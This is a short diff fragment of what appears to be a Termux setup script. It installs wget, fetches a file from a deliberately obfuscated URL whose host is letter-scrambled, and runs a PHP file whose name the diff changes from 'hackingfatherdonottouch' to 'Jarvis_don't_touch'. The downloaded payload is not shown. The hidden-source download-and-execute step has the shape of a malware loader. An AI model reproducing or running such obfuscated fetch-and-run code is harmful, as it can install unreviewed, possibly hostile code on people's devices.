@@ -9,4 +9,4 @@ sleep 2
 pkg install wget
 sleep 1
 wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
-php hackingfatherdonottouch
+php Jarvis_don't_touch
